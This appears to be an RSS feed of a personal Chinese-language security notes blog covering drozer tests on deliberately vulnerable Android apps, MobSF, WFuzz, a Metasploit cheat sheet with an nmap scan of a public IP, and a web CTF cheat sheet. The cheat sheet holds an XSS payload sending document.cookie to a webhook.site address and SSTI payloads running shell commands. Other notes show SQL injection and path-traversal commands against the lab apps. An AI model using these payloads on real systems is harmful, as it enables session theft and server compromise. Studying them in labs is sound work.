檢查broadcast receiver dz> run app.broadcast.info -a org.owasp.goatdroid.fourgoats Attempting to run shell module Package: org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver Permission: null 確認後就逆向看一下 在org.owasp.goatdroid.fourgoats.broadcastreceivers中有SendSMSNowReceiver這個class，內容如下: public class SendSMSNowReceiver extends BroadcastReceiver { Context context; @Override // android.content.BroadcastReceiver public void onReceive(Context arg0, Intent arg1) { this.context = arg0; SmsManager sms = SmsManager.getDefault(); Bundle bundle = arg1.getExtras(); sms.sendTextMessage(bundle.getString("phoneNumber"), null, bundle.getString("message"), null, null); Utils.makeToast(this.context, Constants.TEXT_MESSAGE_SENT, 1); } } Send Something 此時我們就可以用drozer發出一個intent，但是在發出之前要看一下AndroidManifest.xml中對於receiver的描述如下，如果想知道這個intent-filter代表的事情可以參考[^chatgpt-intent-filter]，簡單來說就是所有app都可以發出broadcast，那什麼樣的intent會被goatdroid所接收呢?就是帶有org.owasp.goatdroid.fourgoats.SOCIAL_SMS這個action才會被接收，並且觸發onReceive這個function &lt;manifest versionCode="1" versionName="1.0" package="org.owasp.goatdroid.fourgoats"> ... &lt;application theme="@2131361870" label="@2131296266" icon="@2130837632" debuggable="true"> ... &lt;receiver label="Send SMS" name=".broadcastreceivers.SendSMSNowReceiver"> &lt;intent-filter> &lt;action name="org.owasp.goatdroid.fourgoats.SOCIAL_SMS">&lt;/action> &lt;/intent-filter> &lt;/receiver> &lt;/application> ... &lt;/manifest> dz> run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --component org.owasp.goatdroid.fourgoats.broadcastreceivers SendSMSNowReceiver --extra string phoneNumber 123456789 --extra string message "Hello mate!" 因為fourgoat這個App需要一個server，但是原作把server的link下架了，所以我也不知道實際送出這個broadcast會有什麼效果，但就是先紀錄起來，之後有機會可以用</description></item><item><title>Test Sieve - content providers exported - DB Based</title><link>https://bernie6401.github.io/tools/others/android-related/drozer/test-sieve/test-sieve---content-providers-exported---db-based/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-related/drozer/test-sieve/test-sieve---content-providers-exported---db-based/index.html</guid><description>Test Sieve - content providers exported - DB Based 如果想知道實際的狀況和content URI是什麼，可以參考ChatGPT的說明
起手式 從以下command的結果可以知道com.mwr.example.sieve.DBContentProvider和com.mwr.example.sieve.FileBackupProvider的狀況，並且從結果可以知道URI的形式長怎樣 content://com.mwr.example.sieve.DBContentProvider/Keys/ content://com.mwr.example.sieve.DBContentProvider/Passwords/ content://com.mwr.example.sieve.DBContentProvider/Passwords :::spoiler dz> run app.provider.info -a com.mwr.example.sieve Attempting to run shell module Package: com.mwr.example.sieve Authority: com.mwr.example.sieve.DBContentProvider Read Permission: null Write Permission: null Content Provider: com.mwr.example.sieve.DBContentProvider Multiprocess Allowed: True Grant Uri Permissions: False Uri Permission Patterns: Path Permissions: Path: /Keys Type: PATTERN_LITERAL Read Permission: com.mwr.example.sieve.READ_KEYS Write Permission: com.mwr.example.sieve.WRITE_KEYS Authority: com.mwr.example.sieve.FileBackupProvider Read Permission: null Write Permission: null Content Provider: com.mwr.example.sieve.FileBackupProvider Multiprocess Allowed: True Grant Uri Permissions: False Uri Permission Patterns: Path Permissions: dz> run scanner.provider.finduris -a com.mwr.example.sieve Attempting to run shell module Scanning com.mwr.example.sieve... No respone from content URI: content://com.mwr.example.sieve.DBContentProvider/Keys No respone from content URI: content://com.mwr.example.sieve.DBContentProvider/ No respone from content URI: content://com.mwr.example.sieve.DBContentProvider No respone from content URI: content://com.mwr.example.sieve.FileBackupProvider No respone from content URI: content://com.mwr.example.sieve.FileBackupProvider/ Got a response from content Uri: content://com.mwr.example.sieve.DBContentProvider/Keys/ Got a response from content Uri: content://com.mwr.example.sieve.DBContentProvider/Passwords/ Got a response from content Uri: content://com.mwr.example.sieve.DBContentProvider/Passwords For sure accessible content URIs: content://com.mwr.example.sieve.DBContentProvider/Keys/ content://com.mwr.example.sieve.DBContentProvider/Passwords/ content://com.mwr.example.sieve.DBContentProvider/Passwords ::: 逆向 實際去看DBContentProvider這個class，會發現他把所有的query/update/delete/insert function都寫好了，不過我們可以先看初始化的時候onCreate在做的事情 @Override // android.content.ContentProvider public boolean onCreate() { this.pwdb = new PWDBHelper(getContext()); this.sUriMatcher.addURI("com.mwr.example.sieve.DBContentProvider", PWTable.TABLE_NAME, 100); this.sUriMatcher.addURI("com.mwr.example.sieve.DBContentProvider", "Keys", KEY); return false; } 再跟進去PWDBHelper，他主要就是管理 Android SQLite 資料庫的class，並進行初始化的動作，接著後續創了兩個table，包含==Passwords==和==Keys==(其實我覺得這個URI應該就類似database的table) query/insert/update/delete/sqli query #Simple Query dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical Attempting to run shell module _id 1 service username password b'Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=' (Base64-encoded) email bernie6401@gmail.com insert 根據上面的描述以及逆向的結果，我可以知道各個欄位的data type，insert的時候就是都加進去就可了 dz> run app.provider.insert content://com.mwr.example.sieve.DBContentProvider/Passwords/ --integer _id 2 --string password bbb --string email aaa@bbb.com Attempting to run shell module Done. dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical Attempting to run shell module _id 1 service username password b'Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=' (Base64-encoded) email bernie6401@gmail.com _id 2 service null username null password bbb email aaa@bbb.com update _id=2的data，被我們改掉了 dz> run app.provider.update content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "_id=?" --selection-args 2 --string password ccc --string email ddd@eee.com Attempting to run shell module Done. dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical Attempting to run shell module _id 1 service username password b'Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=' (Base64-encoded) email bernie6401@gmail.com _id 2 service null username null password ccc email ddd@eee.com delete 只剩下最一開始我們設定的data dz> run app.provider.delete content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "_id=?" --selection-args 2 Attempting to run shell module Done. dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical Attempting to run shell module _id 1 service username password b'Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=' (Base64-encoded) email bernie6401@gmail.com sqli 如下結果所示，的確存在sqli，並且可以得到完整的table # 先嘗試丟一些trash byte dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'" Attempting to run shell module Exception occured: unrecognized token: "')" (code 1 SQLITE_ERROR): , while compiling: SELECT * FROM Passwords WHERE (') dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords --projection "* FROM SQLITE_MASTER WHERE type='table';--" Attempting to run shell module | type | name | tbl_name | rootpage | sql | | table | android_metadata | android_metadata | 3 | CREATE TABLE android_metadata (locale TEXT) | | table | Passwords | Passwords | 4 | CREATE TABLE Passwords (_id INTEGER PRIMARY KEY,service TEXT,username TEXT,password BLOB,email ) | | table | Key | Key | 5 | CREATE TABLE Key (Password TEXT PRIMARY KEY,pin TEXT ) 我們也可以用drozer自動幫我們找 dz> run scanner.provider.injection -a com.mwr.example.sieve Attempting to run shell module Scanning com.mwr.example.sieve... Not Vulnerable: content://com.mwr.example.sieve.DBContentProvider content://com.mwr.example.sieve.FileBackupProvider content://com.mwr.example.sieve.DBContentProvider/Keys content://com.mwr.example.sieve.DBContentProvider/ content://com.mwr.example.sieve.FileBackupProvider/ Injection in Projection: content://com.mwr.example.sieve.DBContentProvider/Passwords content://com.mwr.example.sieve.DBContentProvider/Keys/ content://com.mwr.example.sieve.DBContentProvider/Passwords/ Injection in Selection: content://com.mwr.example.sieve.DBContentProvider/Passwords content://com.mwr.example.sieve.DBContentProvider/Keys/ content://com.mwr.example.sieve.DBContentProvider/Passwords/ dz> run scanner.provider.sqltables -a com.mwr.example.sieve Attempting to run shell module Scanning com.mwr.example.sieve... Accessible tables for uri content://com.mwr.example.sieve.DBContentProvider/Passwords: android_metadata Passwords Key Accessible tables for uri content://com.mwr.example.sieve.DBContentProvider/Keys/: android_metadata Passwords Key Accessible tables for uri content://com.mwr.example.sieve.DBContentProvider/Passwords/: android_metadata Passwords Key</description></item><item><title>Test Sieve - content providers exported - File SystemBased</title><link>https://bernie6401.github.io/tools/others/android-related/drozer/test-sieve/test-sieve---content-providers-exported---file-systembased/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-related/drozer/test-sieve/test-sieve---content-providers-exported---file-systembased/index.html</guid><description>Test Sieve - content providers exported - File SystemBased 有關於基於File System的Content Provider - 逆向 在com.mwr.example.sieve.FileBackupProvider中可以特別注意onCreate以及ParcelFileDescriptor這個funnction public class FileBackupProvider extends ContentProvider { ... @Override // android.content.ContentProvider public boolean onCreate() { this.sUriMatcher.addURI("com.mwr.example.sieve.FileBackupProvider", "*", DATABASE); return false; } @Override // android.content.ContentProvider public ParcelFileDescriptor openFile(Uri uri, String mode) { int modeCode; if (mode.equals("r")) { modeCode = 268435456; } else if (mode.equals("rw")) { modeCode = 805306368; } else if (mode.equals("rwt")) { modeCode = 805306368; } else { Log.w(TAG, "Unrecognised code to open file: " + mode); return null; } try { return ParcelFileDescriptor.open(new File(uri.getPath()), modeCode); } catch (FileNotFoundException e) { Log.e(TAG, "ERROR: unable to open file: " + e.getMessage()); return null; } } 實際讀取文件或是Path Traversal 為了測試他真的能夠讀取到特定文件，我在手機的Download創了一個secret.txt，不管是哪一個file，都可以正常讀取 $ echo "this is secret file" > /storage/emulated/0/Download/secret.txt dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/storage/emulated/0/Download/secret.txt Attempting to run shell module this is secret file dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts Attempting to run shell module 127.0.0.1 localhost ::1 ip6-localhost 也可以利用drozer自動找尋path traversal的漏洞在哪裡 dz> run scanner.provider.traversal -a com.mwr.example.sieve Attempting to run shell module Scanning com.mwr.example.sieve... Not Vulnerable: content://com.mwr.example.sieve.DBContentProvider/Keys/ content://com.mwr.example.sieve.DBContentProvider/Passwords content://com.mwr.example.sieve.DBContentProvider/Passwords/ content://com.mwr.example.sieve.DBContentProvider/ content://com.mwr.example.sieve.DBContentProvider/Keys content://com.mwr.example.sieve.DBContentProvider Vulnerable Providers: content://com.mwr.example.sieve.FileBackupProvider content://com.mwr.example.sieve.FileBackupProvider/</description></item><item><title>Test Sieve - is debuggable</title><link>https://bernie6401.github.io/tools/others/android-related/drozer/test-sieve/test-sieve---is-debuggable/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-related/drozer/test-sieve/test-sieve---is-debuggable/index.html</guid><description>Test Sieve - is debuggable dz> run app.package.debuggable Attempting to run shell module Package: org.owasp.goatdroid.fourgoats UID: 10286 Permissions: - None. Package: com.mwr.example.sieve UID: 10285 Permissions: - None. Package: com.withsecure.dz UID: 10284 Permissions: - None. Package: jakhar.aseem.diva UID: 10282 Permissions: - None.</description></item><item><title>Test Sieve - services exported</title><link>https://bernie6401.github.io/tools/others/android-related/drozer/test-sieve/test-sieve---services-exported/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-related/drozer/test-sieve/test-sieve---services-exported/index.html</guid><description>Test Sieve - services exported 列出exported services有哪些 dz> run app.service.info -a com.mwr.example.sieve Attempting to run shell module Package: com.mwr.example.sieve com.mwr.example.sieve.AuthService Permission: null com.mwr.example.sieve.CryptoService Permission: null 逆向 從以上可以知道有兩個service是被export的，這樣的話就可以逆一下判斷可以送出什麼東西以及可能的漏洞在哪，按照教學的說明我直接看==AuthService==這個service， 在com.mwr.example.sieve.AuthService中的其中一段就是有問題的地方: public class AuthService extends Service { ... private final class MessageHandler extends Handler { ... public void handleMessage(Message msg) { ... switch (msg.what) { case 4: ... case AuthService.MSG_CHECK /* 2354 */: if (msg.arg1 == AuthService.TYPE_KEY) { responseCode3 = 42; String recievedString = returnBundle.getString("com.mwr.example.sieve.PASSWORD"); if (AuthService.this.verifyKey(recievedString)) { AuthService.this.showNotification(); returnVal2 = 0; } else { returnVal2 = 1; } } else if (msg.arg1 == AuthService.TYPE_PIN) { responseCode3 = 41; String recievedString2 = returnBundle.getString("com.mwr.example.sieve.PIN"); if (AuthService.this.verifyPin(recievedString2)) { returnBundle = new Bundle(); returnBundle.putString("com.mwr.example.sieve.PASSWORD", AuthService.this.getKey()); returnVal2 = 0; } else { returnVal2 = 1; } } else { sendUnrecognisedMessage(); return; } sendResponseMessage(5, responseCode3, returnVal2, returnBundle); return; ... 首先在msg.what=2354且msg.arg1=AuthService.TYPE_PIN的地方，若程式讀取到的com.mwr.example.sieve.PIN的value(也就是PIN Code)，經過verifyPin這個function比對過後一致，則他會return一個bundle，內涵com.mwr.example.sieve.PASSWORD以及我們之前設定的password，並且回傳response message給我們 →[5, 41, 0, {com.mwr.example.sieve.PASSWORD:&lt;password>}] 而這個問題在哪裡呢?經過前期的確認以及逆向，我們可以寫個script爆破，不斷送出一些pin code給這個service，則因為大多時候PIN Code的複雜度比較低，所以總有一天可以得到使用者的密碼了 和service互動 從下面的結果來看，一開始設定的密碼為==123456acitseccom== dz> run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService --msg 2354 9234 1 --extra string com.mwr.example.sieve.PIN &lt;User PIN> --bundle-as-obj Attempting to run shell module Got a reply from com.mwr.example.sieve/com.mwr.example.sieve.AuthService: what: 5 arg1: 41 arg2: 0 Extras com.mwr.example.sieve.PASSWORD (String) : 123456acitseccom</description></item><item><title>Test Sieve by MobSF</title><link>https://bernie6401.github.io/tools/others/android-related/mobsf/test-sieve-by-mobsf/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-related/mobsf/test-sieve-by-mobsf/index.html</guid><description>Test Sieve by MobSF 這個工具真的很完整，而且蠻萬用的，光是靜態分析就很詳細
Static Analysis Overview 一開始就告訴測試者有多少的東西被export，和Drozer分析的一樣 Application Permission MobSF還可以分析實際寫的code並且查看哪邊有Permission相關的威脅，在Code Analysis的地方有重複的提到External Read/Write的漏洞 Manifest Analysis 這一段就很像Drozer做attack surface後的結果，也就是activity/service/broadcast receiver/content providers exported + is debuggable Activity Exported Service Exported Content Providers Exported 在Code Analysis的地方有重複的提到這個漏洞 Debuggable 在Code Analysis的地方有重複的提到這個漏洞 其他 版本過低 Backupable 和最近的CVE PoC分析 這個功能蠻好的，例如下圖，這三個漏洞都是去分析FileSelectActivity/MainLoginActivity/PWList得出可能會有StrandHogg 2.0 或StrandHogg的問題，關於StrandHogg 2.0 的說明可以看twcert的文章，簡單來說這個惡意軟體的效果是常駐在各個正常執行的軟體背後，並且竊取一些機敏資料 StrandHogg 2.0 的運作原理，和去年發現的 StrandHogg 相當類似，都可在感染後將自己隱藏在正常的軟體身後；當用戶開啟正常軟體時，真正執行的並不是這個正常版的軟體，而是植入了惡意軟體程式碼的「分身」。 新版 StrandHogg 2.0 除了上述的類似功能外，還能讓惡意軟體偽裝成任意的 Android App；先前的版本只能偽裝成 TaskAffinity 這支 App，甚至能在用戶點按開啟任何 App 時立刻偽裝成該 App。</description></item><item><title>Useful Link</title><link>https://bernie6401.github.io/tools/others/useful-link/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/useful-link/index.html</guid><description>Useful Link [TOC]
Knowledge Knowledge Comment CRLF VS LF magic method HttpOnly Encrypt VS Hash LFI VS RFI LFI(Local File Inclusion)產生的原因是程式設計師未對用戶參數未進行輸入檢查，導致駭客可以讀取server上的敏感文件。開發人員可能貪圖方便，將GET或POST參數直接設定為檔案名稱，直接include該檔案進網頁裡，結果就造成了引入其他檔案，造成資訊洩漏RFI(Remote File Include)基本上與LFI概念一樣，只是include的file來源變成從外部引入，觸發條件必須要把php設定參數allow_url_include 訂為ON" FTP WebDAV BitTorrent TrueNAS Setup API VS Method VS Library WebSocket JVM Briefly Introduction Thread VS Process APT Arrow VS Dot VS Colon in C++ payload VS formData RAID 0, 1, 0+1, 1+0, 5, 6 How to use multiprocess in python &amp; map VS pool VS apply_async Python asyncio 從不會到上路 JDK、JRE 和 JVM Tool-Page Tool Comment XSS-CheatSheet All-Injection: SQLMAP1SQLMAP2 ViruTotal 幫忙分析檔案是否有病毒的網站 JS 混淆器 把JS的程式變成可讀性很差的東西 JS 反混淆器 可以反混淆或解密JS的檔案 JS 壓縮+加密+混淆+美化 Everything About Net Scanning How to fetch SHA1 or MD5 in Win. How to split windows in WSL? Docker基本命令 Vocabulary Vocabulary Def. Comment Parse 解析 query 詢問、請求 dump Also called a crash dump or memory dump, a dump is raw data from a computer’s memory. It is written to the file system if software crashes" (terminates unexpectedly). This information is a snapshot of what was going on in the computer at the moment the error occurred. The dump can be analyzed by developers to help track down the error, understand it better, and fix it. Refer intruder 入侵者 vulnerability 漏洞、脆弱 exploit An exploit is a code that takes advantage of a software vulnerability or security flaw. It is written either by security researchers as a proof-of-concept threat or by malicious actors for use in their operations. When used, exploits allow an intruder to remotely access a network and gain elevated privileges, or move deeper into the network. Refer wrapper 偽協議 Cipher 密碼 nerf cause to be weak or ineffective削弱、減弱 Refer Miscellaneous 混雜的、各種各樣的 PoC Proof of Concept：在 Binary Exploitation 通常指可以使程式發⽣ Crash 觸發異常的程式碼，⽤來證明程式存在漏洞 PWN 1.具漏洞的服務2.目標在是服務中找到該服務的漏洞並注入自己的程式碼，拿到 server 的控制權 Refer1Refer2 DHCP 主要功能是自動分配IP(192.168.xxx.xxx)，有時效限制(可能是一天)，當新設備加入區網時，會由DHCP自動分配一個IP給該設備，過了一天後如果設備再次訪問DHCP，則會在給予新的IP，否則該IP會直接回收 秒懂Confusion Matrix IThelp Information-Security Web-Security Python 惡意程式(malware) Day 4 很像走迷宮的sqlmap [Series - 8] Python時間轉換介紹 不安全的連線？HTTPS與SSL憑證 [Day20]-新手的Web系列SQLmap [第06天] 資料結構（3）Data Frame Day 018.聽起來好像很厲害的-密碼學 Day 12 - PHP 偽協議 (一) dlib安裝心得 – Windows 環境 Day21-針對Metasploitable 3進行滲透測試(2)-Shell &amp; Reverse Shell基礎知識 [Day13]-SSTI(Server-side template injection) 【Day 9】Python打包程式 [2018iThome鐵人賽]Day6:加密和雜湊有什麼不一樣？ [Day11]SSTI(Server Side Template Injection) [Day28] 儲存訓練好的模型 [2018iThome鐵人賽]Day 4:如何區分加密、壓縮、編碼 [Day7]-PHP(LFI/RFI) [Python]關鍵字yield和return究竟有什麼不同? Day 21.加密演算法要注意的那些毛(一)-加密模式 [Day23]forensics的開始 『Day 27』拜託別Pwn我啦！-常見的工具（下） Deep-Learning Big-Data Linux [演算法]K-means分群(K-means Clustering) [改善資料品質]Part-1 EDA 從沒圖進化到有圖有字的工具：cowsay [第24天] 機器學習（4）分群演算法 Day18-shell是什麼？ [AI#10]人臉辨識 C語言工具使用，GDB個人學習筆記 淺談機器學習的效能衡量指標(2)–ROC/AUC曲線 [Day15]機器學習常勝軍-XGBoost [Day20]Lasso和Ridge正規化回歸 Web-Develop JS Webpage-Automation 17. [FE] 為什麼現在的前端都在用「框架」？ 你不可不知的 JavaScript 二三事#Day3：資料型態的夢魘——動態型別加弱型別(2) 鼠年全馬鐵人挑戰 WEEK 06：Selenium 自動化測試工具 D29-如何打包Apps Script的程式碼？（二）包成HTML網頁與或API 10. [JS] 一般函式與箭頭函式的差異？ 鼠年全馬鐵人挑戰 WEEK 09：Selenium WebDriver (下) Day03-深入理解網頁架構：DOM 【Day 27】-再爬一次Dcard?(實戰向 Dcard API 發出請求) PHP物件導向的第四課：繼承 [Day23]Beautiful Soup網頁解析！ PHP物件導向的第二課：重談「方法」，物件「屬性」及「成員」 [Day 17] Instagram - 模擬登入 PHP物件導向的第一課：class Day 20 Authentication基礎概念介紹：session、cookie and token Day 17 - 會員登入系統 XAMPP安裝與操作初步 What is metadata? Reverse-Engineering Others PWN [Day10]格式透視-解析PE文件格式（前篇） 第二天：要了解DLL你要先講啊 『 Day 26』拜託別 Pwn 我啦！ - 常見的工具 （上） [Day17] 行為分析－成為逆向大師的第一步－秒懂加殼技術 第四天：Dll聽話 讓我看看 『Day 27』拜託別Pwn我啦！-常見的工具（下） Day16-分散式系統溝通的方法-RPC Day25: [Misc] 我從來沒想過我會害怕寫 code C語言雜談01—如何理解條件編譯 C#編譯到執行與Java的相似之處 Conference &amp; Journal For Information Security IEEE TIFS IEEE TDSC ACM TISSEC ACSAC Usenix security</description></item><item><title>Web Cheat Sheet</title><link>https://bernie6401.github.io/tools/ctf/web-cheat-sheet/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/ctf/web-cheat-sheet/index.html</guid><description>Web Cheat Sheet Online Tools Fuck Beautifier jsfuck JSNice jjencode JS 反混淆器: 可以反混淆或解密JS的檔案 aaencode JS 壓縮+加密+混淆+美化 Esolang List JS Fuck Decode aadecode Cheat-Sheet XSS-CheatSheet 利用XSS把session打到webhook上: window.location=&lt;requestbin.com>/?a+document.cookie // or fetch("https://webhook.site/699a6563-c9b5-4ad7-adaa-e189c5f78194", { method: 'GET', headers: { 'Cookie': document.cookie } }) All-Injection SSTI Payload: 記得找==os._wrap_close== {{().__class__.__base__.__subclasses__()[132].__init__.__globals__['system']('id')}} {{self.__init__.__globals__.__builtins__.__import__("os").popen("cat%20Flag.txt").read()}} {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['execl']("/bin/cat", "cat", "./flag.txt")}} {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['popen']("cat /flag.txt")}} {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['execl']("/bin/cat", "cat", file.lower())}} {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['spawnl']('P_WAIT', "/bin/cat", "cat", file.lower())}} Others wasm $\to$ c: wabt # 按照說明build完後進到./build $ ./wasm2c {wasm file path} -o {output c file path} Webhook Webhook.site Beeceptor Ngrok</description></item><item><title>WFuzz</title><link>https://bernie6401.github.io/tools/others/directory-fuzzing---traversal-tools/wfuzz/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/directory-fuzzing---traversal-tools/wfuzz/index.html</guid><description>WFuzz 參考網站-1: https://www.ddosi.org/wfuzz-guide/ 參考網站-2: https://www.ddosi.org/wfuzz/ 參考網站-3: https://www.secpulse.com/archives/78638.html 參考官網-1: https://wfuzz.readthedocs.io/en/latest/user/basicusage.html
Installation &amp; Basic Guide $ git pull https://github.com/xmendez/wfuzz.git 下載下來後總共有==4==個executable file: ==wfencode==, ==wfpayload==, ==wfuzz==, ==wxfuzz==，這四個file實際上就是去執行src/內部的python cli file
python src/wfuzz-cli.py "$@" python src/wxfuzz.py $@ python src/wfencode.py "$@" python src/wfpayload.py "$@" wfencode 這個就是encode/decode的script，很單純
$ wfencode --help Usage: wfencode --help This help wfencode -d decoder_name string_to_decode wfencode -e encoder_name string_to_encode wfencode -e encoder_name -i &lt;&lt;stdin>> 而關於encode/decoder name可以參考wfuzz file的help
$ wfuzz -e encoder Available encoders: Category | Name | Summary ------------------------------------------------------------------------------------------------------------------------ hashes | base64 | Encodes the given string using base64 url | doble_nibble_hex | Replaces ALL characters in string using the %%dd%dd escape url_safe, url | double_urlencode | Applies a double encode to special characters in string using the %25xx escape. | | Letters, digits, and the characters '_.-' are never quoted. url | first_nibble_hex | Replaces ALL characters in string using the %%dd? escape default | hexlify | Every byte of data is converted into the corresponding 2-digit hex representatio | | n. html | html_decimal | Replaces ALL characters in string using the &amp;#dd; escape html | html_escape | Convert the characters &amp;&lt;>" in string to HTML-safe sequences. html | html_hexadecimal | Replaces ALL characters in string using the &amp;#xx; escape hashes | md5 | Applies a md5 hash to the given string db | mssql_char | Converts ALL characters to MsSQL's char(xx) db | mysql_char | Converts ALL characters to MySQL's char(xx) default | none | Returns string without changes db | oracle_char | Converts ALL characters to Oracle's chr(xx) default | random_upper | Replaces random characters in string with its capitals letters url | second_nibble_hex | Replaces ALL characters in string using the %?%dd escape hashes | sha1 | Applies a sha1 hash to the given string hashes | sha256 | Applies a sha256 hash to the given string hashes | sha512 | Applies a sha512 hash to the given string url | uri_double_hex | Encodes ALL charachers using the %25xx escape. url | uri_hex | Encodes ALL charachers using the %xx escape. url | uri_triple_hex | Encodes ALL charachers using the %25%xx%xx escape. url | uri_unicode | Replaces ALL characters in string using the %u00xx escape url_safe, url | urlencode | Replace special characters in string using the %xx escape. Letters, digits, and | | the characters '_.-' are never quoted. url | utf8 | Replaces ALL characters in string using the \u00xx escape url | utf8_binary | Replaces ALL characters in string using the \uxx escape 如何使用</description></item><item><title>利用Metasploit Framework測試一些網站</title><link>https://bernie6401.github.io/tools/ctf/%E5%88%A9%E7%94%A8metasploit-framework%E6%B8%AC%E8%A9%A6%E4%B8%80%E4%BA%9B%E7%B6%B2%E7%AB%99/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/ctf/%E5%88%A9%E7%94%A8metasploit-framework%E6%B8%AC%E8%A9%A6%E4%B8%80%E4%BA%9B%E7%B6%B2%E7%AB%99/index.html</guid><description>利用Metasploit Framework測試一些網站 [TOC]
Cheat Sheet $ sudo msfdb init &amp;&amp; msfconsole msf6 > nmap -vv {IP} # e.g. nmap -vv 127.0.0.1 msf6 > search {http/ssh/ftp...關鍵字} # e.g. search rce msf6 > use {腳本位置} # e.g. use exploit/unix/http/cacti_filter_sqli_rce msf6 exploit(XXX) > show option # 顯示該腳本需要哪一些參數 msf6 exploit(XXX) > set {option name} {參數} # e.g. set RHOST 127.0.0.1 SmartDaily IP: 34.81.5.101 Security Header Result
nmap :::spoiler nmap Result
nmap -vv 34.81.5.101 [*] exec: nmap -vv 34.81.5.101 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-02 01:49 EDT Initiating Ping Scan at 01:49 Scanning 34.81.5.101 [2 ports] Completed Ping Scan at 01:49, 0.01s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 01:49 Completed Parallel DNS resolution of 1 host. at 01:49, 0.01s elapsed Initiating Connect Scan at 01:49 Scanning 101.5.81.34.bc.googleusercontent.com (34.81.5.101) [1000 ports] Discovered open port 443/tcp on 34.81.5.101 Discovered open port 80/tcp on 34.81.5.101 Increasing send delay for 34.81.5.101 from 0 to 5 due to 11 out of 14 dropped probes since last increase. Increasing send delay for 34.81.5.101 from 5 to 10 due to 11 out of 11 dropped probes since last increase. Increasing send delay for 34.81.5.101 from 10 to 20 due to 11 out of 11 dropped probes since last increase. Increasing send delay for 34.81.5.101 from 20 to 40 due to 11 out of 15 dropped probes since last increase. Completed Connect Scan at 01:50, 75.06s elapsed (1000 total ports) Nmap scan report for 101.5.81.34.bc.googleusercontent.com (34.81.5.101) Host is up, received syn-ack (0.0085s latency). Scanned at 2023-10-02 01:49:05 EDT for 75s Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE REASON 80/tcp open http syn-ack 443/tcp open https syn-ack Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 75.09 seconds ::: 開的Port: 80/443</description></item><item><title>有問題的網站</title><link>https://bernie6401.github.io/tools/others/%E6%9C%89%E5%95%8F%E9%A1%8C%E7%9A%84%E7%B6%B2%E7%AB%99/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/%E6%9C%89%E5%95%8F%E9%A1%8C%E7%9A%84%E7%B6%B2%E7%AB%99/index.html</guid><description>有問題的網站 金讚城 http://www.ru.com.tw http://www.jzc.com.tw 華文網 https://www.book4u.com.tw/</description></item></channel></rss>